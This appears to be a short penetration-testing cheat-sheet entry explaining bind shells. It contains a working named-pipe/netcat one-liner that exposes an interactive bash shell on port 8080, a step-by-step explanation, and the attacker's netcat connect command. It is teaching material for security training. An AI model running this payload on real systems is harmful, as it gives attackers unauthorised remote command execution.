  Bind shell will bind a port on the compromised system and listen for a
  connection; when this connection occurs, it exposes the shell session so the
  attacker can execute commands remotely.

# Bind shells

### Bind shell creation on the target:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

Explanation of the Payload

* `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
* `mkfifo /tmp/f` - This command creates a named pipe, or FIFO, at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
* `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
* `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring error messages are returned to the attacker.
* **`| nc -l 0.0.0.0 8080`** - Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
* `>/tmp/f` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

### Connect from attacker to target:

```
nc -nv <target_ip> <port>
```
